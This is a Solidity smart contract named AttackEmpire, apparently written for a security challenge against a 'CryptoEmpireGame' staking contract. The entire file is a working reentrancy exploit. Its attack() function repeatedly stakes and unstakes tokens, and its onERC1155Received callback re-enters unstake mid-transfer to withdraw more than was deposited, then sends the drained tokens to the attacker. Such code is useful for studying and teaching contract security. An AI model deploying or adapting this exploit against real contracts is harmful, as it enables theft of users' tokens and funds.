// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {CryptoEmpireGame} from "./CryptoEmpireGame.sol";
import {CryptoEmpireToken} from "./CryptoEmpireToken.sol";

contract AttackEmpire is IERC1155Receiver {
    CryptoEmpireGame public game;
    CryptoEmpireToken public token;
    uint256 public attackCount;
    address owner;

    constructor(address _game, address _token) {
        game = CryptoEmpireGame(_game);
        token = CryptoEmpireToken(_token);
        owner = msg.sender;
    }

    function attack() public {
        token.setApprovalForAll(address(game), true);
        while (attackCount < 40) {
            game.stake(2);
            game.unstake(2);
        }

        token.safeTransferFrom(address(this), owner, 2, 20, "0x");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        public
        virtual
        override
        returns (bytes4)
    {
        attackCount++;

        if (attackCount % 2 == 0) {
            for (uint256 i = 0; i < 1; i++) {
                game.unstake(2);
            }
        }

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) public virtual override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
